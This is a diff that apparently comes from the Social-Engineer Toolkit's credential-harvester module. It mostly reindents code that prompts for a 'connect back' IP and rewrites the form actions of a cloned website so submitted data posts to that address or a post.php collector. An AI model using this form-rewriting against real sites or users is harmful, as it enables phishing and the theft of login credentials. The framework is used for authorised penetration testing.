@@ -6,7 +6,7 @@ import re
 import subprocess
 import urlparse
 import shutil
-from src.core.setcore import *                  
+from src.core.setcore import *
 
 
 #
@@ -15,10 +15,10 @@ from src.core.setcore import *
 
 # grab ipaddr
 if check_options("IPADDR=") != 0:
-        ipaddr = check_options("IPADDR=")
+    ipaddr = check_options("IPADDR=")
 else:
-        ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on: "))
-        update_options("IPADDR=" + ipaddr)
+    ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on: "))
+    update_options("IPADDR=" + ipaddr)
 
 # set the multiattack tabnabbing/webjacking flag
 multi_tabnabbing="off"
@@ -49,7 +49,7 @@ apache_mode = check_config("APACHE_SERVER=").lower()
 
 track_user = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 if track_user == "on":
-	apache_mode = "on"
+    apache_mode = "on"
 
 apache_rewrite = ""
 # if we are turned on, change this
@@ -68,17 +68,17 @@ for line in fileopen:
     method_post=re.search("method=post", line, flags=re.IGNORECASE)
     if match or method_post:
 
-        # regex for now, can probably use htmlparser later, but right not what its doing is
-        # replacing any url on the "action" field with your victim IP which will have a custom
-        # web server running to post the data to your site
+    # regex for now, can probably use htmlparser later, but right not what its doing is
+    # replacing any url on the "action" field with your victim IP which will have a custom
+    # web server running to post the data to your site
         if ssl_flag == 'false':
             line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
-	    if apache_mode == "on":
-		line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
+            if apache_mode == "on":
+                line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
         if ssl_flag == 'true':
             line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
-	    if apache_mode == "on":
-		line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
+            if apache_mode == "on":
+                line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
 
 
 
@@ -90,4 +90,4 @@ filewrite.close()
 
 # move our newly created website with our post stuff to our cloned area
 if os.path.isfile("src/program_junk/web_clone/index.html.new"):
-        shutil.move("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/%s" % (site))
+    shutil.move("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/%s" % (site))
